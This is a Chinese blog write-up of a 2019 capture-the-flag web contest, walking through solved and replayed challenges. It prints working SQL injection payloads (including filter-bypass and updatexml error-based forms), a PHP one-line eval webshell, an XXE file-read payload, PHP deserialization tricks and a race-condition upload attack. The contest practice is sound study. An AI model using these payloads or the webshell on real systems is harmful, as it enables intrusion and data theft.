<!DOCTYPE html>
<html>

<head><meta name="generator" content="Hexo 3.9.0">
  
  <title>geek-challenges - Cupid&#39;s Blog</title>
  <meta charset="UTF-8">
  <meta name="description" content="a new ctfer&#39;s study">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  

  <link rel="shortcut icon" href="/favicon.ico" type="image/png">
  <meta name="description" content="下面开始Syc的极客大挑战的writeup由于本校的网站即将关闭，因而以下不给出链接了1.打比赛前先撸一只猫">
<meta property="og:type" content="article">
<meta property="og:title" content="geek-challenges">
<meta property="og:url" content="http://yoursite.com/2019/10/13/geek-challenges/index.html">
<meta property="og:site_name" content="Cupid&#39;s Blog">
<meta property="og:description" content="下面开始Syc的极客大挑战的writeup由于本校的网站即将关闭，因而以下不给出链接了1.打比赛前先撸一只猫">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2019-12-08T08:51:39.967Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="geek-challenges">
<meta name="twitter:description" content="下面开始Syc的极客大挑战的writeup由于本校的网站即将关闭，因而以下不给出链接了1.打比赛前先撸一只猫">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
   
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
  
  
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
  <link rel="stylesheet" href="/css/style.css?v=1577801085757">
</head>

<body class="mdui-drawer-body-left">
  
  <div id="nexmoe-background">
    <div class="nexmoe-bg" style="background-image: url(http://p0.ssl.cdn.btime.com/t01cd55c4b5ab3036c2.jpg#是博客的背景，又是文章默认头图)"></div>
    <div class="mdui-appbar mdui-shadow-0">
      <div class="mdui-toolbar">
        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
        <div class="mdui-toolbar-spacer"></div>
        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
        <a href="/" title="Cupid" class="mdui-btn mdui-btn-icon"><img src="/images/namei.png"></a>
       </div>
    </div>
  </div>
  <div id="nexmoe-header">
      <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Cupid">
            <img src="/images/namei.png" alt="Cupid">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>Articles</span>61</div>
        <div><span>Tags</span>0</div>
        <div><span>Categories</span>0</div>
    </div>
    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                关于博客
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                我的朋友
            </div>
        </a>
        
    </ul>
    <aside id="nexmoe-sidebar">
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">Social</h3>
    <div class="nexmoe-widget nexmoe-social">
        <a class="mdui-ripple" href="https://space.bilibili.com/23290461" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
            <i class="nexmoefont icon-bilibili"></i>
        </a><a class="mdui-ripple" href="https://github.com/bephplover" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
            <i class="nexmoefont icon-github"></i>
        </a>
    </div>
</div>
  
  

  
  
  
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">Archive</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li></ul>
    </div>
  </div>


  
</aside>
    <div class="nexmoe-copyright">
        &copy; 2019 Cupid
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
    </div>
</div><!-- .nexmoe-drawer -->
  </div>
  <div id="nexmoe-content">
    <div class="nexmoe-primary">
        <div class="nexmoe-post">
    <div class="nexmoe-post-cover"> 
        
            <img src="http://p0.ssl.cdn.btime.com/t01cd55c4b5ab3036c2.jpg#是博客的背景，又是文章默认头图">
        
        <h1>geek-challenges</h1>
    </div>
  <div class="nexmoe-post-meta">
    <a><i class="nexmoefont icon-calendar-fill"></i>2019年10月13日</a>
    <a><i class="nexmoefont icon-areachart"></i>4.1k 字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 18 分钟</a>
    
    
  </div>
  <article>
    <p>下面开始Syc的极客大挑战的writeup<br>由于本校的网站即将关闭，因而以下不给出链接了<br>1.打比赛前先撸一只猫<a id="more"></a><br>&emsp;&emsp;这道题算是web的签到题，进入页面后，ctrl+u查看源代码，发现以下代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo $cat;</span><br><span class="line">if($cat==&apos;dog&apos;)&#123;</span><br><span class="line">    echo &apos;Syc&#123;cat_cat_cat_cat&#125;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>因而直接在url上构造cat=dog即可拿到flag.<br>2.你看过我的菜刀么<br>&emsp;&emsp;进入页面后，直接提示了一句：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">直接用菜刀连接，最后找到flag.php拿到flag.</span><br><span class="line">3.BurpSuiiiiiit!!!</span><br><span class="line">&amp;emsp;&amp;emsp;这题会给一个BP的插件，在BP的插件添加进这个jar之后，会给出相关内容，仔细阅读就能得到flag.</span><br><span class="line">4.性感潇文清，在线算卦</span><br><span class="line">&amp;emsp;&amp;emsp;这道题有个提示，动作快点才能算到好卦，猜测可能会用到BP的itrunder或者是使用python脚本。先进入页面，发现了一个算卦post框，像登录框一样。ctrl+u查看源代码：</span><br><span class="line">```$savepath = &quot;uploads/&quot; . sha1($_SERVER[&apos;REMOTE_ADDR&apos;]) . &quot;/&quot;;</span><br><span class="line">    if (!is_dir($savepath)) &#123;</span><br><span class="line">        $oldmask = umask(0);</span><br><span class="line">        mkdir($savepath);</span><br><span class="line">        umask($oldmask);</span><br><span class="line">    &#125;</span><br><span class="line">    if ((@$_GET[&apos;u&apos;]) &amp;&amp; (@$_GET[&apos;p&apos;])) &#123;</span><br><span class="line">        $content = &apos;***************&apos;;</span><br><span class="line">        file_put_contents(&quot;$savepath&quot; . sha1($_GET[&apos;u&apos;]), $content);</span><br><span class="line">        $msg = &apos;Ding!你的算卦结果就在这儿啦！ &apos; . $savepath . htmlspecialchars(sha1($_GET[&apos;u&apos;])) . &quot;&quot;;</span><br><span class="line">        echo $msg;</span><br><span class="line">        usleep(100000);</span><br><span class="line">        @$content = &quot;you are too slow&quot;;</span><br><span class="line">        file_put_contents(&quot;$savepath&quot; . sha1($_GET[&apos;u&apos;]), $content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">试试条件竞争吧？</span><br></pre></td></tr></table></figure></p>
<p>这里提到了条件竞争，于是先学习一波条件竞争<br>这里先不说定义，我看到一个例子特别深刻，说的是当你取钱的时候，你已经申请了取2000快，也就是下单了，如果你足够快，系统还没有反应过来，而你再次申请取两千快，而你的账户里面只有2千块，而刚刚第一次申请的提款机已经准备好了，这时候它处理不过来了，就会给你两次2千块，而你的账户余额就会变成-2000.<br>这里存一个讲条件竞争漏洞的链接（<a href="https://www.jianshu.com/p/09d0eb938e6a" target="_blank" rel="noopener">https://www.jianshu.com/p/09d0eb938e6a</a>）</p>
<p>&emsp;&emsp;这下再来看一下定义：条件竞争发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区，如果没有应用好同步技术则会发生竞争条件问题。。以后还是不写定义了，麻烦，知道大概意思就行了。<br>意思就是在一个可以上传的页面，如果我们一边大量的上传，另一边大量的访问，那么系统总会出错，有些不能上传的shell文件，就被系统所识别并且执行了，成功传入了shell文件。<br>这道题也类似，在百度了其他同样类型题之后，我有了思路。首先使用BP抓包，然后送入Intruder中然后清除标识，再在payloads选项中设置type为Null payloads，然后下面的数量就输入3000，并把线程调为50，然后开始爆破，这样就可以一直上传空数据包。然后呢，在Repeater中进行go，然后把回应中的上传路径复制到url中进行访问再转发，就得到了flag,也就是成功执行了条件竞争漏洞。<br>关于之前截取的代码意思，是讲的这个输入框的处理过程，以及上传路径的一个加密，也就是这样才能实现条件竞争，因为知道了上传的路径才能进行访问。<br>&emsp;&emsp;summary:可以看出来，上传文件的路径，应该是保密起来的，要进行加密对其复杂化，最好能分隔不同文件的上传路径，或者是先不保存到服务器中，在中间再进行一次处理检测，再保存，以防上传类的漏洞。</p>
<p>5.简单的sql(<a href="http://118.25.14.40:8100/" target="_blank" rel="noopener">http://118.25.14.40:8100/</a>)<br>&emsp;&emsp;首先进入页面后会看到一个登陆框，由于题目是sql注入因而直接开始注入，首先输入用户名：admin,输入密码：or ‘1’=’1<br>首先猜测其检测方式，如果是用户名和密码分开检测，则不好注入，至少我现在还不是很会。在我输入了以上内容后出现：check.php:You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘1’=’1’’ at line 1<br>也就是说这是一行，大致猜想判断语句select<br> username and password from DB where username = ‘<strong><strong>‘ and password = ‘</strong></strong>‘ 故继续尝试注入。<br>由于之前误解为了万能密码，后面发现就是简单的没有过滤的sql注入，直接按照常规走，这里注入点在username,直接构造0’ 就会报错。之后获取字段数量，</p>
<figure class="highlight plain"><figcaption><span>order by 3 ```页面回显错误，故字段数量为3.</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">```0&apos; order union select 1,2,database()# ```获取数据库名</span><br><span class="line">```0&apos; order union select 1,2,table_name from information_schema.tables where database()=&quot;geek&quot;# ```即可获取表名，当然可以在后面加上limit 1,1 然后修改,前面的数字即可获取更多的表名。</span><br><span class="line">获取字段内容类似，其他的payload相似就不一一构造了，拿下flag.</span><br><span class="line">6.lovesql</span><br><span class="line">&amp;emsp;&amp;emsp;这道题和简单的sql一样因为做了很久了，可能wp写混了，简单sql好像直接就出flag了，然后lovesql要把流程都走一遍，上面还有一个很小的用sqlmap是没有灵魂的。我的Py环境一样，同样纯手工，payload为上题一样，也没有过滤些什么，就是表有点多，可以几十几十个表的在limit里面加。</span><br><span class="line"></span><br><span class="line">7.代码审计（[http://ctf1.redteam.today:8081/](http://ctf1.redteam.today:8081/)）</span><br><span class="line">&amp;emsp;&amp;emsp;进入页面后一大堆不认识的代码，其中有两行关键得代码：$password = &quot;If I knew where I would die, I would never go there.&quot;;</span><br><span class="line">    $arr = explode(&apos; &apos;, $password);</span><br><span class="line">因而我得去学习一下explode函数，这个函数是把字符串打散为数组。其中是按照空格来存储的，那么我用本地输出一下它的值。</span><br><span class="line">接下来算一下它的长度,count($arr)=12;</span><br><span class="line">startsWith($url,&quot;http://&quot;)这个函数是用来比较后面那个字符串在前一个变量中是否存在，存在则返回true.</span><br><span class="line">// 创建一个新cURL资源</span><br><span class="line">$ch = curl_init();</span><br><span class="line">PHP中使用cURL实现Get和Post请求的方法</span><br><span class="line">php中==是比较值是否相等，例如’1‘=1，而===不仅要求值相等，还要求类型也相等.在多种实验以及测试后，最终放弃了这道题，联系到了大佬说是SSRF，仔细学习后任然解不出来，，等待大佬的WP吧。。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8.Syc柳暗花明([http://118.25.14.40:8108/](http://118.25.14.40:8108/))</span><br><span class="line">&amp;esmp;&amp;esmp;进入页面后，是一大段Syc的小介绍还给了招新群，CTRL+U看下源代码。发现有个href=Secret.php进入到这个PHP下面，页面提示了不是来自www.Sycsecret.com.抓包到BP中，修改Referer: www.Sycsecret.com,提示不是来自Syclover浏览器的.故改User-Agent为这个，之后提示要在本地才能查看，再次添加XFF： 127.0.0.1.最后拿下flag.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9.Babysql</span><br><span class="line">&amp;emsp;&amp;emsp;这道题和简单的sql类似，但是注入点在password,然后过滤了union,table,and这些关键字，过滤掉的关键字可以加\*\*这样就可以正常的显示出来了.</span><br><span class="line">payload:0&apos; or un\*\*ion se\*\*lect 1,2,ta\*\*ble_name from info\*\*rmation_sch\*\*ema.ta\*\*bles wh**ere database()=&apos;greek&apos;#</span><br><span class="line">其他的类似，同样后面需要加limit 1,1 我记得好像有159个表，字段也挺多的，很想用sqlmap跑的，但是我得py环境有点异常，老是跑不出来，最后还是手工注入了。拿下flag.其他的payload类似就不一一书写了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">10.Jiang&apos;s Secret</span><br><span class="line">&amp;emsp;&amp;emsp;进入页面后直接查看源代码，发现了一个./Archive_room.php,然后进去后再查看源代码，又发现一个action.php。这么多跳转页面，直接用BP抓包看，最后在action.php转发时，发现了secr3t.php，进去页面后，说flag在flag.php页面，于是访问flag.php页面回显找不到我，，，.然后页面还有一段php代码</span><br><span class="line">```highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&apos;file&apos;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br></pre></td></tr></table></figure>

<p>从上可以看出来，这个php存在着任意文件的读取，因为把用户可控制的file文件名使用了include包含。因而可以使用payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">获取到的flag.php是base64加密的解码即可拿下flag.</span><br><span class="line">最后拿下了flag.</span><br><span class="line"></span><br><span class="line">11.反序列化</span><br><span class="line">&amp;emsp;&amp;emsp;进入页面后直接ctrl+U查看源代码。</span><br><span class="line">```class Student</span><br><span class="line">&#123;</span><br><span class="line">    public $score = 0;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__destruct working&quot;;</span><br><span class="line">        if($this-&gt;score==10000) &#123;</span><br><span class="line">            $flag = &quot;******************&quot;;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp = $_GET[&apos;exp&apos;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">unserialize($exp);</span><br></pre></td></tr></table></figure>

<p>代码审计可以知道，直接构造一个Student类的序列化，其中包含$score=10000.就可以拿下flag.</p>
<figure class="highlight plain"><figcaption><span>class Student</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    public $score = 10000;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> $class1=new Student;</span><br><span class="line">	echo serialize($class1);</span><br></pre></td></tr></table></figure>

<p>本地输出反序列化的一串然后exp=这一串就拿到了flag.</p>
<p>12.又来一只猫<br>&emsp;&emsp;进入页面说有个备份的好习惯，我马上想到了是不是index.php.bak文件，打开没有，因而直接使用御剑扫描一下，发现了一个zip。打开解压后便出现了源码，源码过多就不一一粘贴了。这里只粘贴关键性的几句。</p>
<figure class="highlight plain"><figcaption><span>'flag.php';</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &apos;nonono&apos;;</span><br><span class="line">    private $password = &apos;yesyes&apos;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &apos;guest&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &apos;admin&apos;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">			echo $username;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&apos;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br></pre></td></tr></table></figure>

<p>上面是test.php的内容，下面</p>
<figure class="highlight plain"><figcaption><span>'class.php';</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$select = $_GET[&apos;select&apos;];</span><br><span class="line">$res=unserialize(@$select);</span><br></pre></td></tr></table></figure>

<p>查看源代码，发现又是一个关于序列化漏洞的题。所谓序列化漏洞是指构造序列化的字符串后会触发魔术方法或者称为魔术函数的自动执行。这可能是程序本身不想看到的结果。其中魔术方法就包括toString(),<strong>construct(),以及</strong>destruct()方法。其中con和de是相反的两个，前面那个是对象建立时会自动调用，后面那个是对象销毁时会自动调用。这里我在构造了与之前的题一样的类的序列化后，发现绕不过，没有满足条件，主要是test.php中定义的变量为私有类，在这里采用同样的方法不行了。在百度了各种资料后，主要搜索关于序列化的漏洞，在这里面发现了几个特别的方法，payload:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">这里使用直接构造的payload不行，其中Name后面的参数代表构造里面变量的数量，privete的参数被序列化后应当添加\00类名，public的序列化不变，protected的参数需要添加\00*\00类名。在class.php中有个__weakup需要绕过，需要将成员属性修改大于实际数目即可绕过。为什么要绕过__wakeup()方法呢，因为它会在unserialize()时会自动调用这个方法，而题目的index.php就调用了。因而它会最先被调用，那么username就变成了guest。为了构造admin那么必须绕过它。最后拿下flag.</span><br><span class="line"></span><br><span class="line">13.你有初恋吗</span><br><span class="line">&amp;emsp;&amp;emsp;页面上面提示了Hash，要Hash出同样的感觉。查看源代码又是一个代码审计题：</span><br><span class="line">```$adore=&apos;***************&apos;;</span><br><span class="line">$now = $_POST[&apos;lover&apos;];</span><br><span class="line">setcookie(&quot;Heart&quot;, md5($adore.&apos;syclover&apos;));</span><br><span class="line">if(isset($now)&amp;&amp;$now!=syclover) &#123;</span><br><span class="line">	if($_COOKIE[&apos;Heart&apos;] === md5($adore. urldecode($now)))&#123;</span><br><span class="line">		die ($flag);</span><br><span class="line">		&#125;else &#123;</span><br><span class="line">			die(&apos;I do not love you! You are not in my heart!&apos;);</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到，绕过很简单，由于会自动urldecode一次，故将syclover两次urldecode就可以了。最后post提交拿下flag</p>
<p>以下下均为自己没有做出来的题，然后看了答案复现一波</p>
<p>1.你有特洛伊木马吗<br>&emsp;&emsp;这道题其实很清楚了就是上传一个一句话木马就可以拿到flag,奈何我之前怎么搞都上传不了。忘记了一个判断一句话木马的几个过滤条件：<br>一般会检测文件名后缀，以及检测PHP起始符(&lt;?),检测content-type的文件类型，并且检测文件头是否是图片的文件头。<br>知道了这四个要求起始就比较容易了，文件内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&apos;cl4y&apos;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>文件后缀采用.phtml现在去试试能否获得flag.<br>按理是可以获得flag的可能是由于环境问题导致没有得到flag,继续下一题复现。</p>
<p>2.性感黄阿姨，在线聊天 –笑<br>&emsp;&emsp;发送flag过去，提示：我很想告诉你的，可惜你只是我的guest<br>抓包后可以看到name的value是guest,改为admin后，提示：</p>
<figure class="highlight plain"><figcaption><span>flag in ./_f14g_Is_Here_.php ,try ro read it!"&#125;```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这里可以直接用弱类型绕过，因为是双等号，直接用Intruder进行爆破，可以得到当name为357时候会提示flag in ./_f14g_ls_Here_.php</span><br><span class="line">然后让我们尝试去读它，在请求数据包中可以看到数据传送方式是json，那么可以猜测xml后端可能也可以解析，修改Content-Type为xml，然后编写一段简单的xml代码：</span><br><span class="line">```&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">	&lt;root&gt;</span><br><span class="line">		&lt;name&gt;357&lt;/name&gt;</span><br><span class="line">		&lt;request&gt;flag&lt;/request&gt;</span><br><span class="line">	&lt;root/&gt;</span><br></pre></td></tr></table></figure>

<p>在response中回显了可惜你只是我的357说明编写的xml也被直接执行了。<br>这里还可发现回显的地方就是name，因而下面在构造xml语句的时候，利用name的值来做相关操作。<br>接下来构造协议流语句读取php文件了，直接读取不出来./<em>f14g_ls_Here</em>.php.这里还有个考点，php文件中有特殊字符(如&lt;)让xml解析时出错了，需要借助php流读取，<br>payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./_f14g_ls_Here_.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">	&lt;root&gt;</span><br><span class="line">		&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">		&lt;request&gt;flag&lt;/request&gt;</span><br><span class="line">	&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>这里还有一点需要注意，直接这样页面不会给出想要的回显，但是在SYSTEM这里换行就可以了，这里应该是个什么需要注意的地方，先记下来。这里我回去试过后发现了原因，在把payload粘贴进去时候有些代码过长会自动换行，而这里换行后，默认会多出一个空格，这里就在base64-encode这中间多了个空格导致整个xml语句出错。<br>复现拿到flag.</p>
<p>3.hardsql<br>&emsp;&emsp;在进行各种尝试后发现union,or,adn等都被过滤掉，这里只能使用报错注入，updatexml,extractvaleue都可以,payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">数据库名：</span><br><span class="line">username=admin&amp;password=admin&apos;^updatexml(1,concat(0x7e,</span><br><span class="line">(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1)# 表</span><br><span class="line">名： username=admin&amp;password=admin&apos;^updatexml(1,concat(0x7e,</span><br><span class="line">(select(group_concat(table_name))from(information_schema.tables)where(table_schem</span><br><span class="line">a)like&apos;geek&apos;),0x7e),1)# 列名：</span><br><span class="line">username=admin&amp;password=admin&apos;^updatexml(1,concat(0x7e,</span><br><span class="line">(select(group_concat(column_name))from(information_schema.columns)where(table_nam</span><br><span class="line">e)like&apos;H4rDsq1&apos;),0x7e),1)# 字段：</span><br><span class="line">username=admin&amp;password=admin&apos;^updatexml(1,concat(0x7e,</span><br><span class="line">(select(group_concat(password))from(H4rDsq1)),0x7e),1)#</span><br></pre></td></tr></table></figure>


  </article>
  
    
<div class="nexmoe-post-copyright">
<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
<strong>Author：</strong>Cupid<br>
<strong>Link：</strong><a href="http://yoursite.com/2019/10/13/geek-challenges/" title="http://yoursite.com/2019/10/13/geek-challenges/" target="_blank" rel="noopener">http://yoursite.com/2019/10/13/geek-challenges/</a><br>

  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可

</div>


  
  <section class="nexmoe-comment">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
<div id="gitalk"></div>
<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
<script type="text/javascript">
    var gitalk = new Gitalk({
        clientID: '80b2453b6d5f37ad6225',
        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
        id: window.location.pathname,
        repo: 'nexmoe.github.io',
        owner: 'nexmoe',
        admin: 'nexmoe'
    })
    gitalk.render('gitalk')
</script>
</section>
</div>
    </div>
